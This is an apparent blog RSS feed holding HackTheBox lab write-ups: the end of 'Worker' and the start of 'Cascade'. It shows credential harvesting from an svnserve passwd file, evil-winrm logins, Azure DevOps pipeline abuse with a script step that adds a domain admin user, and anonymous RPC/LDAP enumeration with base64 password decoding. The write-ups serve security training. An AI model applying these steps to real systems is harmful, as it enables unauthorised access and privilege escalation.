-------------------------------------------------------------------------------
C$           C:\                             Default share
IPC$                                         Remote IPC
W$           W:\                             Default share
ADMIN$       C:\Windows                      Remote Admin
The command completed successfully.
</code></pre><p>There are 4 folders in the <code>W:\</code> drive, the one that interesting is the svnrepos folder.</p>
<pre><code>PS W:\&gt; dir


    Directory: W:\


Mode                LastWriteTime         Length Name                                                             
----                -------------         ------ ----                                                             
d-----       2020-06-16     18:59                agents                                                          
d-----       2020-03-28     15:57                AzureDevOpsData                                                
d-----       2020-04-03     11:31                sites                                                          
d-----       2020-06-20     16:04                svnrepos
</code></pre><p>I can enumerate all folder and sub folder on the <code>W:\</code> drive recursively using the <code>dir</code> command. Because I&rsquo;m on PowerShell, I have to use <code>cmd /c &lt;command&gt;</code> keyword.</p>
<pre><code>PS W:\&gt; cmd.exe /c &quot;dir /s /b svnrepos&quot;
</code></pre><p>Well PowerShell can do that too, but I prefer <code>cmd</code>.</p>
<pre><code>PS W:\&gt; Get-ChildItem -Path W:\svnrepos -Filter * -Recurse -ErrorAction SilentlyContinue -Force
</code></pre><p>In the output, there is a <code>passwd</code> file that immediately draws my attention</p>
<p><img class="img-container" src="imgs/image-20210504232344047.png" alt="image-20210504232344047"  />
</p>
<p>The <code>passwd</code> file contains a bunch of credentials, and my eyes caught the password for <code>robisl</code>.</p>
<pre><code>PS W:\svnrepos\&gt; gc .\www\conf\passwd
### This file is an example password file for svnserve.
### Its format is similar to that of svnserve.conf. As shown in the
### example below it contains one section labelled [users].
### The name and password for each user follow, one account per line.

[users]
nathen = wendel98
nichin = fqerfqerf
nichin = asifhiefh
noahip = player
nuahip = wkjdnw
oakhol = bxwdjhcue
owehol = supersecret
paihol = painfulcode
parhol = gitcommit
pathop = iliketomoveit
pauhor = nowayjose
payhos = icanjive
perhou = elvisisalive
peyhou = ineedvacation
phihou = pokemon
quehub = pickme
quihud = kindasecure
rachul = guesswho
raehun = idontknow
ramhun = thisis
ranhut = getting
rebhyd = rediculous
reeinc = iagree
reeing = tosomepoint
reiing = isthisenough
renipr = dummy
rhiire = users
riairv = canyou
ricisa = seewhich
robish = onesare
robisl = wolves11
robive = andwhich
ronkay = onesare
rubkei = the
rupkel = sheeps
ryakel = imtired
sabken = drjones
samken = aqua
sapket = hamburger
sarkil = friday
</code></pre><h4 id="remote-access---robisl">Remote Access - robisl</h4>
<p>I can login remotely using <code>robisl</code> credentials with <code>evil-winrm</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «worker» «10.10.14.19»
$ evil-winrm -i 10.10.10.203 -u robisl -p wolves11

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\r</span>obisl<span style="color:#ae81ff">\D</span>ocuments&gt; whoami
worker<span style="color:#ae81ff">\r</span>obisl
*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\r</span>obisl<span style="color:#ae81ff">\D</span>ocuments&gt; cd ../Desktop
*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\r</span>obisl<span style="color:#ae81ff">\D</span>esktop&gt; dir


    Directory: C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\r</span>obisl<span style="color:#ae81ff">\D</span>esktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        1/29/2020   3:37 PM             <span style="color:#ae81ff">34</span> user.txt
</code></pre></div><h3 id="shell-as-administrator">Shell as administrator</h3>
<h4 id="azure-devops---partsunlimited">Azure DevOps - PartsUnlimited</h4>
<p>After enumerating many things in the remote shell and coming up empty-handed, I returned to Azure DevOps, but this time with a <code>robisl</code> account.</p>
<p><img class="img-container" src="imgs/image-20210503175744995.png" alt="image-20210503175744995"  />
</p>
<p>Long short story, <code>robisl </code> is member of Build Administrator.</p>
<p><img class="img-container" src="imgs/image-20210503175756504.png" alt="image-20210503175756504"  />
</p>
<p>The Build Administrators defined as follows [<a href="https://docs.microsoft.com/en-us/azure/devops/organizations/security/permissions?view=azure-devops&amp;tabs=preview-page">source</a>].</p>
<p><img class="img-container" src="imgs/image-20210504010111041.png" alt=""  />
</p>
<h4 id="exploit-azure-pipelines---read-the-root-flag">Exploit Azure Pipelines - Read the Root Flag</h4>
<p>So the plan is, I’ll create an Azure pipelines with malicious deployment script/task to execute OS commands.</p>
<p><img class="img-container" src="imgs/image-20210503175809136.png" alt="image-20210503175809136"  />
</p>
<p>If I lookup into the agent pool in the Project Settings menu, there is an available agent named ‘Setup’. The agent is owned by an Administrator account, and as a Build Administrator member (inherited), user <code>robisl</code> also has access to it.</p>
<p><img class="img-container" src="imgs/image-20210503175820811.png" alt="image-20210503175820811"  />
</p>
<p>So, let’s execute the plan!</p>
<p>First, I’ll create a pipeline (Pipelines -&gt; Builds -&gt;  New Pipeline).</p>
<p><img class="img-container" src="imgs/image-20210503175837201.png" alt="image-20210503175837201"  />
</p>
<p>In the next section, I’ll choose Azure Repos Git.</p>
<p><img class="img-container" src="imgs/image-20210503175848517.png" alt="image-20210503175848517"  />
</p>
<p>On the next one, I’ll select &ldquo;PartsUnlimited&rdquo; as the repository, because that is the repo where <code>robisl</code> is working on.</p>
<p><img class="img-container" src="imgs/image-20210503175906165.png" alt="image-20210503175906165"  />
</p>
<p>In the Configure section, scroll down and select the starter pipeline (I forgot the name, but don&rsquo;t choose the existing one). After that, I’ll modify the pool and the script in the &ldquo;Review&rdquo; section to steal the flag.</p>
<p><img class="img-container" src="imgs/image-20210503175920007.png" alt="image-20210503175920007"  />
</p>
<p>The master branch will be the <code>trigger</code> to run the CI\CD (If I push a changes to the &ldquo;PartsUnlimited&rdquo; repository). Since I have access to the &ldquo;Setup&rdquo; pool, I&rsquo;ll use it as the <code>pool</code>. Lastly, on the <code>steps</code> you can add a task/script you want to run/do. In my case, I want to read the root flag.</p>
<p>I’ll save it and run it on a new branch.</p>
<p><img class="img-container" src="imgs/image-20210503175931307.png" alt="image-20210503175931307"  />
</p>
<p>I’ll just wait for the output log.</p>
<p><img class="img-container" src="imgs/image-20210503175944023.png" alt="image-20210503175944023"  />
</p>
<p>Once it completed, I can see the root flag inside the &ldquo;Steal the flag&rdquo; output</p>
<p><img class="img-container" src="imgs/image-20210503175957351.png" alt="image-20210503175957351"  />
</p>
<h4 id="create-user-with-administrator-privileges">Create User with Administrator Privileges</h4>
<p>I can also create a privileged user using multi-line script.</p>
<pre><code>- script: | 
net user iamf YourComplexPassword /add /domain
net localgroup Administrators iamf /add 
net localgroup &quot;Remote Management Users&quot; iamf /add 
displayName: &quot;Set IamF to Admin&quot;
</code></pre><p>I can push it again and wait for it to complete.</p>
<p><img class="img-container" src="imgs/image-20210503180039057.png" alt="image-20210503180039057"  />
</p>
<p>Now I can login with the newly created user.</p>
<p><img class="img-container" src="imgs/image-20210503180028754.png" alt="image-20210503180028754"  />
</p>
<hr>
<p>References:</p>
<ul>
<li><a href="https://docs.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops">https://docs.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops</a></li>
<li><a href="https://adamtheautomator.com/powershell-scripts-azure-devops-pipelines/">https://adamtheautomator.com/powershell-scripts-azure-devops-pipelines/</a></li>
<li><a href="https://docs.microsoft.com/en-us/azure/devops/pipelines/repos/azure-repos-git?view=azure-devops&amp;tabs=yaml#ci-triggers">https://docs.microsoft.com/en-us/azure/devops/pipelines/repos/azure-repos-git?view=azure-devops&amp;tabs=yaml#ci-triggers</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Cascade</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-cascade/</link>
      <pubDate>Fri, 23 Apr 2021 17:09:02 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-cascade/</guid>
      <description>Plundering dead Active Directory accounts</description>
      <content:encoded><![CDATA[<p>Cascade is another fun Windows machine with Medium difficulty from HackTheBox created by <a href="https://vbscrub.com/">VbScrub</a>, the creator of <a href="/writeup/htb-nest">Nest</a>. It starts with by enumerating LDAP to find a custom LDAP attribute on one of the users to gain initial access to SMB shares. Enumeration on SMB discovers VNC credentials that can be decrypted using IRB. The credentials can be used to gain a foothold on the system. Another enumeration on SMB with those credentials finds a set of custom application. The database file used by the application contains an encrypted credentials of another user which can be decrypted by reversing the application. The last credentials I obtained allow me to recover the administrator password from AD Recycle Bin.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>RPC enumeration</li>
<li>Decrypting VNC password</li>
<li>Reversing .NET</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>smbclient - Preinstalled in Kali Linux</li>
<li>rpcclient - Preinstalled in Kali Linux</li>
<li>smbget - Preinstalled in Kali Linux</li>
<li>evil-winrm - <a href="https://github.com/Hackplayers/evil-winrm">https://github.com/Hackplayers/evil-winrm</a></li>
<li>dnSpy - <a href="https://github.com/dnSpy/dnSpy/">https://github.com/dnSpy/dnSpy/</a></li>
<li>Impacket - <a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p><code>nmap</code> shows the typical port used by Active Directory domain controller.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «nmap» «192.168.43.234»
$ mkdir nmap; nmap -sC -sV -oA nmap/initial-cascade 10.10.10.182

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 <span style="color:#f92672">(</span>1DB15D39<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Windows Server <span style="color:#ae81ff">2008</span> R2 SP1<span style="color:#f92672">)</span>
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 <span style="color:#f92672">(</span>1DB15D39<span style="color:#f92672">)</span>
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2020-06-03 00:20:10Z<span style="color:#f92672">)</span>
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: cascade.local, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: cascade.local, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
3269/tcp  open  tcpwrapped
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 1s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2020-06-03T00:21:02
|_  start_date: 2020-06-02T04:24:21
</code></pre></div><p><code>nmap</code> discovers the domain name of Cascade and also identifies the OS version.</p>
<p>I&rsquo;ll take notes on these:</p>
<ul>
<li>Domain: <code>cascade.local</code></li>
<li>Host: Windows Server 2008 R2 SP1</li>
</ul>
<p>The full scan almost returns the same result, except it discovers a WinRM port (5985).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «nmap» «192.168.43.234»
$ nmap -p- -oA nmap/full-cascade cascade.htb

PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49165/tcp open  unknown
</code></pre></div><blockquote>
<p>I&rsquo;ve added <code>10.10.10.182 cascade.htb</code> to my <code>/etc/hosts</code></p>
</blockquote>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-445---smb--rpc-over-smb">TCP 445 - SMB / RPC over SMB</h3>
<p>Anonymous login is allowed on SMB port. I tried to list all the shares using <code>smbclient</code> but there was nothing there.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «nmap» «192.168.43.234»
$ smbclient -N -L //10.10.10.182
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available
</code></pre></div><h4 id="enumeration-via-rpc">Enumeration via RPC</h4>
<p>Knowing anonymous login is allowed on SMB, I can try it too on RPC using <code>rpcclient</code> and it works as well.</p>
<p>With current access, I can obtain the domain users and their groups manually.</p>
<p>User enumeration</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «nmap» «192.168.43.234»
$ rpcclient -U <span style="color:#e6db74">&#39;%&#39;</span> 10.10.10.182
rpcclient $&gt;
rpcclient $&gt; enumdomusers
user:<span style="color:#f92672">[</span>CascGuest<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x1f5<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>arksvc<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x452<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>s.smith<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x453<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>r.thompson<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x455<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>util<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x457<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>j.wakefield<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x45c<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>s.hickson<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x461<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>j.goodhand<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x462<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>a.turnbull<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x464<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>e.crowe<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x467<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>b.hanson<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x468<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>d.burman<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x469<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>BackupSvc<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x46a<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>j.allen<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x46e<span style="color:#f92672">]</span>
user:<span style="color:#f92672">[</span>i.croft<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x46f<span style="color:#f92672">]</span>
</code></pre></div><p>I&rsquo;ll save the output to a file called <code>users</code>, and filter the usernames only then pipe it to <code>users.list</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «cascade» «192.168.43.234»
$ cat users | tr -d <span style="color:#e6db74">&#39;[]&#39;</span> | cut -d <span style="color:#e6db74">&#39; &#39;</span> -f1 | cut -c6- | tee users.list
CascGuest
arksvc
s.smith
r.thompson
util
j.wakefield
s.hickson
j.goodhand
a.turnbull
e.crowe
b.hanson
d.burman
BackupSvc
j.allen
i.croft
</code></pre></div><p>Builtin group enumeration</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">rpcclient $&gt; enumalsgroups builtin
group:<span style="color:#f92672">[</span>Pre-Windows <span style="color:#ae81ff">2000</span> Compatible Access<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x22a<span style="color:#f92672">]</span>
group:<span style="color:#f92672">[</span>Incoming Forest Trust Builders<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x22d<span style="color:#f92672">]</span>
group:<span style="color:#f92672">[</span>Windows Authorization Access Group<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x230<span style="color:#f92672">]</span>
group:<span style="color:#f92672">[</span>Terminal Server License Servers<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x231<span style="color:#f92672">]</span>
group:<span style="color:#f92672">[</span>Users<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x221<span style="color:#f92672">]</span>
group:<span style="color:#f92672">[</span>Guests<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x222<span style="color:#f92672">]</span>
group:<span style="color:#f92672">[</span>Remote Desktop Users<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x22b<span style="color:#f92672">]</span>
group:<span style="color:#f92672">[</span>Network Configuration Operators<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x22c<span style="color:#f92672">]</span>
group:<span style="color:#f92672">[</span>Performance Monitor Users<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x22e<span style="color:#f92672">]</span>
group:<span style="color:#f92672">[</span>Performance Log Users<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x22f<span style="color:#f92672">]</span>
group:<span style="color:#f92672">[</span>Distributed COM Users<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x232<span style="color:#f92672">]</span>
group:<span style="color:#f92672">[</span>IIS_IUSRS<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x238<span style="color:#f92672">]</span>
group:<span style="color:#f92672">[</span>Cryptographic Operators<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x239<span style="color:#f92672">]</span>
group:<span style="color:#f92672">[</span>Event Log Readers<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x23d<span style="color:#f92672">]</span>
group:<span style="color:#f92672">[</span>Certificate Service DCOM Access<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x23e<span style="color:#f92672">]</span>
</code></pre></div><p>Domain group enumeration</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">rpcclient $&gt; enumalsgroups domain
group:<span style="color:#f92672">[</span>Cert Publishers<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x205<span style="color:#f92672">]</span>
group:<span style="color:#f92672">[</span>RAS and IAS Servers<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x229<span style="color:#f92672">]</span>
group:<span style="color:#f92672">[</span>Allowed RODC Password Replication Group<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x23b<span style="color:#f92672">]</span>
group:<span style="color:#f92672">[</span>Denied RODC Password Replication Group<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x23c<span style="color:#f92672">]</span>
group:<span style="color:#f92672">[</span>DnsAdmins<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x44e<span style="color:#f92672">]</span>
group:<span style="color:#f92672">[</span>IT<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x459<span style="color:#f92672">]</span>
group:<span style="color:#f92672">[</span>Production<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x45a<span style="color:#f92672">]</span>
group:<span style="color:#f92672">[</span>HR<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x45b<span style="color:#f92672">]</span>
group:<span style="color:#f92672">[</span>AD Recycle Bin<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x45f<span style="color:#f92672">]</span>
group:<span style="color:#f92672">[</span>Backup<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x460<span style="color:#f92672">]</span>
group:<span style="color:#f92672">[</span>Temps<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x463<span style="color:#f92672">]</span>
group:<span style="color:#f92672">[</span>WinRMRemoteWMIUsers__<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x465<span style="color:#f92672">]</span>
group:<span style="color:#f92672">[</span>Remote Management Users<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x466<span style="color:#f92672">]</span>
group:<span style="color:#f92672">[</span>Factory<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x46c<span style="color:#f92672">]</span>
group:<span style="color:#f92672">[</span>Finance<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x46d<span style="color:#f92672">]</span>
group:<span style="color:#f92672">[</span>Audit Share<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x471<span style="color:#f92672">]</span>
group:<span style="color:#f92672">[</span>Data Share<span style="color:#f92672">]</span> rid:<span style="color:#f92672">[</span>0x472<span style="color:#f92672">]</span>
</code></pre></div><p>List group members:</p>
<p>Members of IT group (rid:0x459)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">rpcclient $&gt; queryaliasmem domain 0x459
 sid:<span style="color:#f92672">[</span>S-1–5–21–3332504370–1206983947–1165150453–1106<span style="color:#f92672">]</span>
 sid:<span style="color:#f92672">[</span>S-1–5–21–3332504370–1206983947–1165150453–1107<span style="color:#f92672">]</span>
 sid:<span style="color:#f92672">[</span>S-1–5–21–3332504370–1206983947–1165150453–1109<span style="color:#f92672">]</span>
rpcclient $&gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–1106
S-1–5–21–3332504370–1206983947–1165150453–1106 CASCADE<span style="color:#ae81ff">\a</span>rksvc <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>
rpcclient $&gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–1107
S-1–5–21–3332504370–1206983947–1165150453–1107 CASCADE<span style="color:#ae81ff">\s</span>.smith <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>
rpcclient $&gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–1109
S-1–5–21–3332504370–1206983947–1165150453–1109 CASCADE<span style="color:#ae81ff">\r</span>.thompson <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>
</code></pre></div><p>Members of Remote Management Users group (rid:0x466)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">rpcclient $&gt; queryaliasmem domain 0x466
 sid:<span style="color:#f92672">[</span>S-1–5–21–3332504370–1206983947–1165150453–1106<span style="color:#f92672">]</span>
 sid:<span style="color:#f92672">[</span>S-1–5–21–3332504370–1206983947–1165150453–1107<span style="color:#f92672">]</span>
rpcclient $&gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–1106
S-1–5–21–3332504370–1206983947–1165150453–1106 CASCADE<span style="color:#ae81ff">\a</span>rksvc <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>
rpcclient $&gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–1107
S-1–5–21–3332504370–1206983947–1165150453–1107 CASCADE<span style="color:#ae81ff">\s</span>.smith <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>
</code></pre></div><p>Member of AD Recycle Bin</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">rpcclient $&gt; queryaliasmem domain 0x45f
 sid:<span style="color:#f92672">[</span>S-1–5–21–3332504370–1206983947–1165150453–1106<span style="color:#f92672">]</span>
rpcclient $&gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–1106
S-1–5–21–3332504370–1206983947–1165150453–1106 CASCADE<span style="color:#ae81ff">\a</span>rksvc <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>
</code></pre></div><p>Members of HR (rid:0x45b)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">rpcclient $&gt; queryaliasmem domain 0x45b
 sid:<span style="color:#f92672">[</span>S-1–5–21–3332504370–1206983947–1165150453–1121<span style="color:#f92672">]</span>
</code></pre></div><p>Members of Audit group (rid:0x471)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">rpcclient $&gt; queryaliasmem domain 0x471
 sid:<span style="color:#f92672">[</span>S-1–5–21–3332504370–1206983947–1165150453–1107<span style="color:#f92672">]</span>
rpcclient $&gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–1107
S-1–5–21–3332504370–1206983947–1165150453–1107 CASCADE<span style="color:#ae81ff">\s</span>.smith <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>
</code></pre></div><p>Members of Data share group (rid:0x472)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">rpcclient $&gt; queryaliasmem domain 0x472
 sid:<span style="color:#f92672">[</span>S-1–5–21–3332504370–1206983947–1165150453–513<span style="color:#f92672">]</span>
rpcclient $&gt; lookupsids S-1–5–21–3332504370–1206983947–1165150453–513
S-1–5–21–3332504370–1206983947–1165150453–513 CASCADE<span style="color:#ae81ff">\D</span>omain Users <span style="color:#f92672">(</span>2<span style="color:#f92672">)</span>
</code></pre></div><p>After enough digging, I did a password spray with a pattern of “username%username”, but no luck.</p>
<p>Before moving on, I&rsquo;ll note the Remote Management Users group members:</p>
<ul>
<li><code>arksvc</code></li>
<li><code>s.smith</code></li>
</ul>
<h3 id="tcp-389---ldap">TCP 389 - LDAP</h3>
<p>In LDAP, anonymous login are also allowed.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «cascade» «192.168.43.234»
$ ldapsearch -h <span style="color:#e6db74">&#39;10.10.10.182&#39;</span> -x -b <span style="color:#e6db74">&#34;dc=cascade,dc=local&#34;</span> &gt; ldap-enum
</code></pre></div><blockquote>
<p>Nmap already identifies the Active Directory domain name as <code>cascade.local</code>. Because AD is basically based on the LDAP protocol, in LDAP form or known as a distinguished name, the AD domain usually follows &ldquo;DC=NAME,DC=TLD&rdquo;.</p>
<ul>
<li>cascade = NAME</li>
<li>local = TLD (Top-Level Domain)</li>
</ul>
</blockquote>
<p>While examining the output from <code>ldap-enum</code>, I spotted an interesting line from user Ryan Thompson.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">...&lt;snip&gt;...
displayName: Ryan Thompson
uSNCreated: <span style="color:#ae81ff">24610</span>
memberOf: CN<span style="color:#f92672">=</span>IT,OU<span style="color:#f92672">=</span>Groups,OU<span style="color:#f92672">=</span>UK,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
uSNChanged: <span style="color:#ae81ff">295010</span>
name: Ryan Thompson
...&lt;snip&gt;...
logonCount: <span style="color:#ae81ff">2</span>
sAMAccountName: r.thompson
sAMAccountType: <span style="color:#ae81ff">805306368</span>
userPrincipalName: r.thompson@cascade.local
objectCategory: CN<span style="color:#f92672">=</span>Person,CN<span style="color:#f92672">=</span>Schema,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>cascade,DC<span style="color:#f92672">=</span>local
...&lt;snip&gt;...
lastLogonTimestamp: <span style="color:#ae81ff">132294360317419816</span>
msDS-SupportedEncryptionTypes: <span style="color:#ae81ff">0</span>
cascadeLegacyPwd: clk0bjVldmE<span style="color:#f92672">=</span>
</code></pre></div><p>The <code>cascadeLegacyPwd: clk0bjVldmE=</code> line only appears on Ryan Thompson section and it can be decoded into <code>rY4n5eva</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «cascade» «192.168.43.234»
$ echo clk0bjVldmE<span style="color:#f92672">=</span> | base64 -d
rY4n5eva
</code></pre></div><p>I&rsquo;ll mark the accounts that have a <code>logonCount</code> value greater than one:</p>
<p><img class="img-container" src="imgs/image-20210423204454321.png" alt="image-20210423204454321"  />
</p>
